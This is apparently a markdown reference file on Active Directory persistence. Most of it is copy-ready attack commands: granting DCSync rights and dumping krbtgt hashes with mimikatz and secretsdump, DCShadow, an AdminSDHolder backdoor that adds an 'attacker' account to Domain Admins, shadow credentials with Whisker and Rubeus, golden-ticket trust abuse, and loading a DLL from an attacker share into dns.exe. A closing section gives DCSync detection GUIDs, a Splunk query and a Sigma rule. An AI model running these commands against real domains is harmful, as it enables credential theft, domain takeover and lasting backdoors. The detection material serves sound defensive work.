---
description: DCSync, DCShadow, AdminSDHolder, shadow credentials, trust abuse, DCSync detection via replication GUIDs
---

# Active Directory Persistence

## DCSync
- Requires: DS-Replication-Get-Changes + DS-Replication-Get-Changes-All
```powershell
# Grant DCSync rights (if you have WriteDACL)
Add-ObjectACL -PrincipalIdentity attacker -Rights DCSync
```
```
# Dump hashes
mimikatz # lsadump::dcsync /domain:domain.local /user:krbtgt
# Or with secretsdump
secretsdump.py domain/user:pass@DC_IP
```

## DCShadow
- Register rogue DC and push changes to real DC
```
# Requires SYSTEM + DA privileges in two shells
# SYSTEM shell:
lsadump::dcshadow /object:targetUser /attribute:description /value:"owned"
# DA shell:
lsadump::dcshadow /push
```

## AdminSDHolder Backdoor
```powershell
# Grant GenericAll on AdminSDHolder (propagates to all protected groups in ~60min)
Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName attacker -Rights All
# Verify
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ? {$_.IdentityReference -match 'attacker'}
# Now can add self to DA anytime
net group "Domain Admins" attacker /add /domain
```

## Shadow Credentials
- Requires WRITE on target's msDS-KeyCredentialLink attribute
```cmd
Whisker.exe add /target:targetUser
# Returns Rubeus command to get TGT for target
Rubeus.exe asktgt /user:target /certificate:<base64cert> /password:<certpass>
```

## Trust Abuse
```powershell
# Child domain to parent (DA in child -> EA in parent)
# Forge inter-realm TGT with SID history of Enterprise Admins
kerberos::golden /domain:child.domain.local /sid:CHILD_SID /sids:PARENT_EA_SID /rc4:CHILD_KRBTGT /user:admin /ptt
```

## DnsAdmins to SYSTEM
- Member of DnsAdmins can load arbitrary DLL into dns.exe (SYSTEM)
```cmd
dnscmd DC01 /config /serverlevelplugindll \\ATTACKER\share\evil.dll
sc \\DC01 stop dns & sc \\DC01 start dns
```

## DCSync Detection

### Replication Permission GUIDs
Three GUIDs indicate DCSync capability:
- `1131f6aa-9c07-11d1-f79f-00c04fc2dcd2` — DS-Replication-Get-Changes
- `1131f6ad-9c07-11d1-f79f-00c04fc2dcd2` — DS-Replication-Get-Changes-All
- `89e95b76-444d-4c62-991a-0facbeda640c` — DS-Replication-Get-Changes-In-Filtered-Set

### Event-Based Detection
- **Event ID 4662** with above GUIDs from non-DC source = DCSync attempt
- Filter machine accounts ending with `$` (DCs replicate legitimately)
- Non-DC user triggering replication = CRITICAL alert

Splunk:
```
index=windows EventCode=4662 Properties IN ("1131f6aa*","1131f6ad*","89e95b76*") | where NOT match(SubjectUserName, "\$$") | table _time, SubjectUserName, SubjectDomainName, ObjectName
```

Sigma rule (vendor-agnostic):
```yaml
title: DCSync Attack Detected
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 4662
    Properties|contains:
      - '1131f6aa'
      - '1131f6ad'
  filter:
    SubjectUserName|endswith: '$'
  condition: selection and not filter
level: critical
```
